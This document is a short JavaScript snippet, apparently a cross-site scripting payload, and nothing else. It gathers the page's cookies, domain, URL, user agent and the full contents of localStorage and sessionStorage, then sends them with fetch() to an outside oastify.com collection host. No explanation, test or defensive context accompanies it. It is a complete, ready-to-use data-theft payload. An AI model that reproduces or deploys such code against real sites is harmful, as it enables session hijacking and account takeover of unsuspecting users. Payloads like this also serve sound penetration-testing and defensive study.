fetch('https://mwmulrx9vp5ziqmzuwi7mi3leck38vwk.oastify.com/log?data=' + encodeURIComponent(
  JSON.stringify({
    cookies: document.cookie,
    domain: document.domain,
    url: location.href,
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage},
    userAgent: navigator.userAgent
  })
));
